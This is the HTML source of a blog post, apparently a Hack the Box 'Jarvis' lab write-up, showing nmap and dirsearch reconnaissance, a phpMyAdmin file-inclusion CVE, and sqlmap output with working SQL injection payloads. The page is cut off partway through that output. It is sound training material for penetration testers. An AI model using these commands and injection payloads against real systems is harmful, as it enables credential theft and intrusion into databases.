@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.ico>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Ryan Kozak - Hack the Box Jarvis Writeup</title>
+<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Jarvis&#32;Writeup />
+<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Jarvis&#32;Writeup />
+<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Jarvis&#32;Writeup />
+<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;Hack&#32;the&#32;Box&#32;Jarvis&#32;Writeup />
+<meta property="og:site_name" content="Ryan Kozak" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="http://localhost:1313/posts/hack-the-box-jarvis-writeup/" />
+<link rel="canonical" href="http://localhost:1313/posts/hack-the-box-jarvis-writeup/" itemprop="url" />
+<meta name="url" content="http://localhost:1313/posts/hack-the-box-jarvis-writeup/" />
+<meta name="twitter:url" content="http://localhost:1313/posts/hack-the-box-jarvis-writeup/" />
+<meta property="og:url" content="http://localhost:1313/posts/hack-the-box-jarvis-writeup/" />
+
+
+<meta property="og:updated_time" content="2019-11-09T18:34:23-07:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="Ryan Kozak" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.3">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="http://localhost:1313/">
+                <img src="/images/d0n601.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="http://localhost:1313/">
+                <h1>Ryan Kozak</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Hacking, web development, $other
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-armageddon-writeup/">Hack the Box Armageddon Writeup</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-ophiuchi-writeup/">Hack the Box Ophiuchi Writeup</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/luks-encrypted-arch-linux-on-pinebook-pro-again/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/luks-encrypted-arch-linux-on-pinebook-pro/">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/hack-the-box-traceback-writeup/">Hack the Box Traceback Writeup</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://whodis@ryankozak.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+
+
+        <p class="footnote">
+    &copy; 2024 Ryan Kozak. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/hack-the-box-jarvis-writeup/">Hack the Box Jarvis Writeup</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2019-11-09T18:34:23-0700" class="post-date">
+        November 9, 2019
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>12 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/badge.png" alt="Hack The Box Writeup"></p>
+<h1 id="information-gathering">Information Gathering</h1>
+<h2 id="nmap">Nmap</h2>
+<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC -p- 10.10.10.143
+</span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 22:36 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.143
+</span></span><span style="display:flex;"><span>Host is up (0.35s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+</span></span><span style="display:flex;"><span>|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 (Debian)
+</span></span><span style="display:flex;"><span>|_http-title: Stark Hotel
+</span></span><span style="display:flex;"><span>5355/tcp  filtered llmnr
+</span></span><span style="display:flex;"><span>64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 (Debian)
+</span></span><span style="display:flex;"><span>|_http-title: Site doesnt have a title (text/html).
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 3380.59 seconds
+</span></span></code></pre></div><p>From the above output we can see that ports, <strong>22</strong>, <strong>80</strong>, <strong>5355</strong>, and <strong>64999</strong> are open.</p>
+<p>We know the common ports for ssh and http are open, and we&rsquo;ll explore those in a moment. <a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution" target="_blank">Link-Local Multicast Name Resolution</a> is running on port <strong>5355</strong>, and the path we&rsquo;ll be taking to get root doesn&rsquo;t involve that, but I&rsquo;m interested to read other hackers&rsquo; writeups to see if there is another method to root involving port <strong>5355</strong>. It looks like port <strong>64999</strong> serves a ban notice, but that never comes into play for us either.</p>
+<h2 id="http-enumeration">HTTP Enumeration</h2>
+<p>Browsing to port <strong>80</strong>, we come across the website for the Stark Hotel. The site is written in PHP, but doesn&rsquo;t appear to be running any known CMS.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/stark_hotel.png" alt="The Stark Hotel">
+<strong>Figure 1:</strong> The Stark Hotel</p>
+<p>While we explore the Stark Hotel&rsquo;s website manually, it&rsquo;s a good idea to run a directory enumeration script in the background to find more interesting things. Since I&rsquo;ve become a big fan of <a href="https://github.com/maurosoria/dirsearch" target="_blank">dirsearch</a> that&rsquo;s what we&rsquo;ll use here. In this instance we&rsquo;re using the default wordlist with <code>txt</code> and <code>php</code> extensions, and telling it to run recursively.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Tools/dirsearch# python3 dirsearch.py -u http://10.10.10.143 -e txt,php -r
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> _|. _ _  _  _  _ _|_    v0.3.8
+</span></span><span style="display:flex;"><span>(_||| _) (/_(_|| (_| )
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Extensions: txt, php | HTTP method: get | Threads: 10 | Wordlist size: 6390 | Recursion level: 1
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Error Log: /root/Tools/dirsearch/logs/errors-19-07-25_12-39-55.log
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Target: http://10.10.10.143
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[12:39:57] Starting: 
+</span></span><span style="display:flex;"><span>[12:43:54] 200 -   23KB - /index.php
+</span></span><span style="display:flex;"><span>[12:43:56] 200 -   23KB - /index.php/login/
+</span></span><span style="display:flex;"><span>[12:45:12] 200 -   14KB - /phpmyadmin/
+</span></span><span style="display:flex;"><span>[12:46:54] Starting: css/
+</span></span><span style="display:flex;"><span>[12:47:03] 200 -    6KB - /css/.DS_Store
+</span></span><span style="display:flex;"><span>[12:53:40] Starting: fonts/
+</span></span><span style="display:flex;"><span>[12:53:49] 200 -    8KB - /fonts/.DS_Store
+</span></span><span style="display:flex;"><span>[13:00:32] Starting: images/
+</span></span><span style="display:flex;"><span>[13:00:40] 200 -    6KB - /images/.DS_Store
+</span></span><span style="display:flex;"><span>[13:07:19] Starting: js/
+</span></span><span style="display:flex;"><span>[13:07:28] 200 -    6KB - /js/.DS_Store
+</span></span><span style="display:flex;"><span>[13:14:16] Starting: phpmyadmin/
+</span></span><span style="display:flex;"><span>[13:14:25] 200 -  274B  - /phpmyadmin/.editorconfig
+</span></span><span style="display:flex;"><span>[13:14:25] 200 -   24B  - /phpmyadmin/.eslintignore
+</span></span><span style="display:flex;"><span>[13:16:58] 200 -   19KB - /phpmyadmin/ChangeLog
+</span></span><span style="display:flex;"><span>[13:17:06] 200 -    3KB - /phpmyadmin/composer.json
+</span></span><span style="display:flex;"><span>[13:17:10] 200 -   89KB - /phpmyadmin/composer.lock
+</span></span><span style="display:flex;"><span>[13:17:14] 200 -    2KB - /phpmyadmin/CONTRIBUTING.md
+</span></span><span style="display:flex;"><span>[13:17:30] 200 -  958B  - /phpmyadmin/doc/
+</span></span><span style="display:flex;"><span>[13:17:44] 200 -    2KB - /phpmyadmin/examples/
+</span></span><span style="display:flex;"><span>[13:17:47] 200 -   22KB - /phpmyadmin/favicon.ico
+</span></span><span style="display:flex;"><span>[13:18:13] 200 -   14KB - /phpmyadmin/import.php
+</span></span><span style="display:flex;"><span>[13:18:16] 200 -   14KB - /phpmyadmin/index.php
+</span></span><span style="display:flex;"><span>[13:18:18] 200 -   14KB - /phpmyadmin/index.php/login/
+</span></span><span style="display:flex;"><span>[13:18:32] 200 -   18KB - /phpmyadmin/LICENSE
+</span></span><span style="display:flex;"><span>[13:18:32] 200 -   14KB - /phpmyadmin/license.php
+</span></span><span style="display:flex;"><span>[13:19:14] 200 -  733B  - /phpmyadmin/package.json
+</span></span><span style="display:flex;"><span>[13:19:24] 200 -   14KB - /phpmyadmin/phpinfo.php
+</span></span><span style="display:flex;"><span>[13:19:46] 200 -    1KB - /phpmyadmin/README
+</span></span><span style="display:flex;"><span>[13:19:51] 200 -   26B  - /phpmyadmin/robots.txt
+</span></span><span style="display:flex;"><span>[13:20:04] 200 -   10KB - /phpmyadmin/setup/
+</span></span><span style="display:flex;"><span>[13:20:18] 200 -    2KB - /phpmyadmin/sql/
+</span></span><span style="display:flex;"><span>[13:20:18] 200 -   14KB - /phpmyadmin/sql.php
+</span></span><span style="display:flex;"><span>[13:20:36] 200 -    8KB - /phpmyadmin/templates/
+</span></span><span style="display:flex;"><span>[13:20:41] 200 -  958B  - /phpmyadmin/tmp/
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/autoload.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_classmap.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_namespaces.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_files.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_psr4.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_static.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/ClassLoader.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_real.php
+</span></span><span style="display:flex;"><span>[13:20:57] 200 -    1KB - /phpmyadmin/vendor/composer/LICENSE
+</span></span><span style="display:flex;"><span>[13:20:58] 200 -   32KB - /phpmyadmin/vendor/composer/installed.json
+</span></span><span style="display:flex;"><span>[13:21:13] Starting: server-status/
+</span></span><span style="display:flex;"><span>[13:28:15] Starting: doc/
+</span></span><span style="display:flex;"><span>[13:35:11] Starting: examples/
+</span></span><span style="display:flex;"><span>[13:45:28] Starting: libraries/
+</span></span><span style="display:flex;"><span>[13:56:16] Starting: setup/
+</span></span><span style="display:flex;"><span>[14:05:05] Starting: sql/
+</span></span><span style="display:flex;"><span>[14:13:28] Starting: templates/
+</span></span><span style="display:flex;"><span>[14:21:55] Starting: themes/
+</span></span><span style="display:flex;"><span>[14:30:43] Starting: tmp/
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Task Completed
+</span></span></code></pre></div><p>I&rsquo;ve omitted the <code>301</code> and <code>403</code> responses from the output above so that it isn&rsquo;t quite as long. Anyhow, the most important discovery made during directory enumeration is that of the <code>phpmyadmin</code> directory and some of its exposed contents.</p>
+<p>We can gather that the version of <code>phpmyadmin</code> installed is <strong>4.8.0</strong>. There are a few ways to do this, but one of the ways is through the exposed change log file at <code>http://10.10.10.143/phpmyadmin/ChangeLog</code>.</p>
+<p>This version is vulnerable to  <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613" target="_blank">CVE-2018-12613</a>,</p>
+<blockquote>
+<p>An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for white-listed pages. An attacker must be authenticated, except in the &ldquo;$cfg[&lsquo;AllowArbitraryServer&rsquo;] = true&rdquo; case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the &ldquo;$cfg[&lsquo;ServerDefault&rsquo;] = 0&rdquo; case (which bypasses the login requirement and runs the vulnerable code without any authentication).</p>
+</blockquote>
+<h3 id="manual-exploration">Manual Exploration</h3>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/room.png" alt="Room 1: room.php?cod=1">
+<strong>Figure 2:</strong> Room 1: room.php?cod=1</p>
+<p>We also know that the site is running a custom PHP application for the Stark Hotel which appears as if it may have an SQL injection vulnerability in the way it handles displaying the rooms <code>http://10.10.10.143/room.php?cod=SOMETHINGDIRTY!</code>.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>In order to exploit the local file inclusion vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613" target="_blank">CVE-2018-12613</a>) on the version of phpmyadmin running, which can lead to remote code execution, we need to get some login credentials.</p>
+<h3 id="sqlmap">sqlmap</h3>
+<p>Attempting SQL injection manually through the url bar didn&rsquo;t get us very far. In this instance we turn to sqlmap to do the work for us (feel like script kiddie?). Below is the output for having sqlmap dump the output of the usernames and passwords it can find.</p>
+<p><strong>Note</strong>: It should be noted that these were cached already because I first ran sqlmap with the <code>-a</code> flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~# sqlmap -u &#39;http://10.10.10.143/room.php?cod=5&#39; --users --passwords
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___[&#39;]_____ ___ ___  {1.3.6#stable}
+</span></span><span style="display:flex;"><span>|_ -| . [&#39;]     | .&#39;| . |
+</span></span><span style="display:flex;"><span>|___|_  [(]_|_|_|__,|  _|
+</span></span><span style="display:flex;"><span>      |_|V...       |_|   http://sqlmap.org
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] starting @ 11:56:36 /2019-07-22/
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[11:56:36] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+</span></span><span style="display:flex;"><span>[11:56:36] [INFO] testing connection to the target URL
+</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point(s) from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: cod (GET)
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: cod=5 AND 9234=9234
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    Type: time-based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span></span><span style="display:flex;"><span>    Payload: cod=5 AND (SELECT 8600 FROM (SELECT(SLEEP(5)))FUdN)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    Type: UNION query
+</span></span><span style="display:flex;"><span>    Title: Generic UNION query (NULL) - 7 columns
+</span></span><span style="display:flex;"><span>    Payload: cod=-1326 UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x67666f747663416d57796c4c674d574841464b6e62774362465953737151417651536f7a526e526e,0x7170787871),NULL,NULL,NULL,NULL,NULL-- rAJB
